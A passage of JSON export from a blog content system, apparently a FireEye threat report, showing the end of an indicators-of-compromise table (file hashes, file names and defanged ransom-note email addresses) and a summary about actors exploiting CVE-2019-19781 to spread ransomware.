width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ee345c861058a18510e7c4bb616e3fd9f\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eavpass.exe\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EHost\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E48452dd2506831d0b340e45b08799623\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Esince1969.exe\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EEmail Address\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Easgardmaster5@protonmail[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFrom ransom note\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EEmail Address\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eragnar0k@ctemplar[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFrom ransom note\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EEmail Address\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022252\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Ej.jasonm@yandex[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022194\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFrom ransom note\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 3: Collection of IOCs from this blog post\u003C\/span\u003E\u003C\/p\u003E\n",
        "jcr:lastModified": "Fri Jan 24 2020 18:58:49 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EFireEye continues to observe actors taking advantage of CVE-2019-19781, this time with the likely intent of distributing ransomware.\u003C\/p\u003E\n",
      "jcr:lastModified": "Fri Jan 24 2020 16:34:38 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Fri Jan 24 2020 16:37:14 GMT+0000",
      "imageRotate": "0"
    }
  }
}
